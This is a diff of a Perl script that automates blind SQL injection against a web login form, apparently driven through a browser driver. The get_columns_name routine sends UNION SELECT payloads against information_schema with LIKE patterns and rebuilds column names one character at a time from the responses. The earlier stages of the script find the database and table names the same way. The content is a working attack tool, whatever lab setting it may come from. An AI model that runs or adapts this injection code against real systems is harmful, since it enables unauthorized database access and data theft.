@@ -93,48 +93,39 @@ sub discover_table_name {
 }
 
 sub get_columns_name {
-    
     my ($ncln, $database_name, $table_name) = @_;
     
     my $clquery =  'NULL,' x $ncln;
     chop $clquery;
-    my $query = '';
-    my $column_name = '';
-    my %columns_name;
+    my ($query,$column_name,$lc);
+    my @columns_name;
+    my @characters;
     my %badparams;
-    $badparams{$_} = 1 foreach (37, 95);
-    my $found = 0;
-    while (1) {
+    push @characters, chr(int($_)) foreach (32 .. 94);
+    push @characters,qw({ | } ~ `);
+    splice(@characters,5,1);
 
-	for my $i (32 .. 126) {
-	    next if (exists  $badparams{$i});
-	    my $c = chr(int($i));
-	    $query  = "admin123' UNION SELECT " . $clquery  . " FROM information_schema.COLUMNS WHERE table_schema=" . "'" . $database_name . "'"  . " and table_name=" . "'" . $table_name . "'" ;
-	    $query .= " and COLUMN_NAME like " .  "'" . $column_name .  $c  . "%" . "'" . ";--";
+    for  my $c (@characters) {
+	$query  = "admin123' UNION SELECT " . $clquery  . " FROM information_schema.COLUMNS WHERE table_schema=" . "'" . $database_name . "'"  . " and table_name=" . "'" . $table_name . "'" ;
+	$query .= " and COLUMN_NAME like " .  "'"  .  $c  . "%" . "'" . ";--";
+	if (expected_value(send_query($query))) {
+	    $column_name = $c;
+	    $lc = 0;
+	    while ( $lc < $#characters) {
+		$query  = "admin123' UNION SELECT " . $clquery  . " FROM information_schema.COLUMNS WHERE table_schema=" . "'" . $database_name . "'"  . " and table_name=" . "'" . $table_name . "'" ;
+		$query .= " and COLUMN_NAME like " .  "'" . $column_name .  $characters[$lc]  . "%" . "'" . ";--";
+		if (expected_value(send_query($query))) {
+		    $column_name .= $characters[$lc];
+		    say "found:" . $column_name;
+		    $lc = 0;
+		} else {$lc++}
 
-	    if (expected_value(send_query($query))) {
-		$column_name .= $c;
-	        next if (exists  $columns_name{$column_name});
-		$found = 1;
-		last;
-	    }
-	    
-	    if ($i == 126) {
-		$found = 0;
-		my $skip_c = substr($c,0,1);
-		$badparams{ $skip_c} = 1;
-		last;
 	    }
 	}
-	    
-	
-       if ($found) {
-	   $columns_name{$column_name} = 1;
-	   say "found: " .  $column_name;
-	}
-	say (keys %badparams);
+	push @columns_name, $column_name  if $column_name;
 	$column_name = '';
     }
+    return @columns_name;
 }
     
 
@@ -144,7 +135,7 @@ my $database = lc(discover_database_name($columns_n));
 say "database: " . $database;
 my $table = discover_table_name($columns_n,$database);
 say "table name : " . $table;
-get_columns_name ($columns_n, $database, $table);
-
+my @columns_name = get_columns_name ($columns_n, $database, $table);
+say "Colunas:" .  @columns_name ;
 $driver->quit(); 
 
